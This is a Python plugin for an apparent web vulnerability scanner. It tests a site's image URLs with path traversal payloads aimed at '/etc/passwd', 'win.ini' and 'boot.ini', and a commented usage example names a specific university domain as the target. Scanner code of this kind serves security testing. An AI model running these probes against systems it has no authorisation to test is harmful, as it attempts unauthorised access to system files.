from utils.status import *
from .helper import Plugin, utils
import requests
import sys
import urllib.request
from bs4 import BeautifulSoup
import time

class PathTraverser(Plugin):
    def __init__(self):
        self.name = "Path Traverser"
        self.enable = True
        self.description = "Checks for Path Traversal vulnerabilities by finding image links and testing them with traversal payloads."
        self.payloads = [
            "../",
            "../../../../../../../../etc/passwd",
            "../../../../../../../../windows/win.ini",
            "../../../../../../../../boot.ini"
        ]

    def presquites(self, host):
        if utils.isalive(utils.uri(host)):
            return True
        return False

    def get_image_urls(self, host):
        try:
            response = urllib.request.urlopen(utils.uri(host))
            soup = BeautifulSoup(response, 'lxml')
            img_tags = soup.find_all('img')
            img_urls = [img['src'] for img in img_tags if 'src' in img.attrs and img['src'].startswith('https://') and img['src'].endswith('.png')]
            return img_urls
        except Exception as e:
            print(f"Error fetching image URLs: {e}")
        return []

    def vuln(self, img_url):
        try:
            for payload in self.payloads:
                full_url = f"{img_url}/{payload}"
                response = utils.requests.get(full_url, verify=False)
                if response.status_code == 200 and ("root:" in response.text or "Windows" in response.text or "Index of /wp-content/uploads" in response.text):
                    return True
        except Exception as e:
            print(f"Error checking path traversal: {e}")
        return False

    def main(self, host):
        try:
            image_urls = self.get_image_urls(host)
            for img_url in image_urls:
                if img_url.startswith("https://www."+host):
                    if self.vuln(img_url):
                        return Result(
                            status=SUCCESS,
                            msg=f"Path Traversal vulnerability found with image URL: {img_url}",
                            request=img_url,
                            response=None
                        )
                    break  # Exit the loop after the first image URL is processed
            return Result(
                status=FAILED,
                msg="No Path Traversal vulnerabilities found",
                request=None,
                response=None
            )
        except Exception as e:
            return Result(
                status=FAILED,
                msg=str(e),
                request=None,
                response=None
            )

# Usage example (assuming you have set up the appropriate environment and utils):
# traverser = PathTraverser()
# result = traverser.main('dsu.edu.pk')
# print(result)